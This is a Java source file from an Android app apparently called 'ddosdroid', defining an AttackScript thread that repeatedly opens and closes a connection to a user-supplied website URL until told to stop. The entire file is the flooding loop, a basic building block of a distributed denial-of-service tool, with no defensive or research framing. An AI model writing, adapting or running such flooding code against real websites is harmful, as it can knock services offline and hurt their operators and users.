package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attack.service;

import android.util.Log;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;

    /*
        This class works only with an existing website.
        Otherwise readUrl() obtains null InputStream.
        Ideally the app should inform the user on that case.
    */

public class AttackScript extends Thread {
    private static final String TAG = "AttackScript";
    private URL url;
    private AtomicBoolean stopped = new AtomicBoolean(false);

    public AttackScript(String website) {
        initializeUrl(website);
    }

    private void initializeUrl(String website) {
        try {
            url = new URL(website);
        } catch (MalformedURLException e) {
            Log.e(TAG, "Wrong url?", e);
        }
    }

    @Override
    public void run() {
        while (!stopped.get()) {
            readUrl();
        }
        Log.d(TAG, "Exited from thread");
    }

    private void readUrl() {
        InputStream in = null;
        try {
            in = url.openStream();
        } catch (FileNotFoundException e) {
            Log.w(TAG, "Website " + url + " not found.");
        } catch (IOException e) {
            Log.e(TAG, "openStream() error.", e);
        } finally {
            closeInputStream(in);
        }
    }

    private void closeInputStream(InputStream in) {
        try {
            if (in != null) {
                in.close();
            } else {
                Log.w(TAG, "inputStream is null. Is " + url + " a valid website?");
            }
        } catch (IOException e) {
            Log.e(TAG, "Error while closing the input stream.", e);
        }
    }

    public void stopExecution() {
        stopped.set(true);
    }
}
